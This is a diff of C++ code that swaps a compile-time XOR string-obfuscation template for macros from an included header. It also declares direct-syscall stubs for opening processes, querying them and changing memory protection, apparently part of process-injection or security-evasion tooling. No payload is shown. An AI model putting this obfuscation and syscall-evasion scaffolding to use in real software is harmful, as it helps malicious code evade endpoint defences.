@@ -7,40 +7,10 @@
 #include <map>
 #include <cstring>
 
-constexpr unsigned char OBF_SEED = (__TIME__[7] ^ __TIME__[4] ^ __TIME__[1]) & 0xFF;
+#include "sbox_shred.h"
 
-constexpr unsigned char GenKey(unsigned char idx, unsigned char seed) {
-    return ((seed + idx) ^ ((idx * 7) + 0x41)) & 0xFF;
-}
-
-template<size_t N, unsigned char SEED>
-struct ObfString {
-    unsigned char data[N];
-
-    constexpr explicit ObfString(const char(&str)[N]) : data{} {
-        for (unsigned char i = 0; i < N; ++i) {
-            data[i] = static_cast<unsigned char>(str[i]) ^ GenKey(i, SEED);
-        }
-    }
-
-    template<size_t M>
-    bool deobfuscate(char (&out)[M]) const {
-        if (M < N) return false;
-        for (unsigned char i = 0; i < N; ++i) {
-            out[i] = static_cast<char>(data[i] ^ GenKey(i, SEED));
-        }
-        return true;
-    }
-
-    [[nodiscard]] std::string str() const {
-        char buf[N];
-        deobfuscate(buf);
-        return std::string(buf);
-    }
-};
-
-#define MAKE_OBF(str) ObfString<sizeof(str), OBF_SEED>(str)
-#define DECR_STR(obf) (obf).str()
+#define MAKE_OBF(str) SHRED(str)
+#define DECR_STR(obf) REVEAL_STR(obf)
 
 typedef LONG NTSTATUS;
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -100,9 +70,7 @@ extern "C" {
     extern DWORD g_SysNtQueryInformationProcess;
     extern DWORD g_SysNtWaitForSingleObject;
     extern DWORD g_SysNtProtectVirtualMemory;
-}
 
-extern "C" {
     NTSTATUS SyscallNtOpenProcess(
         PHANDLE ProcessHandle,
         ACCESS_MASK DesiredAccess,
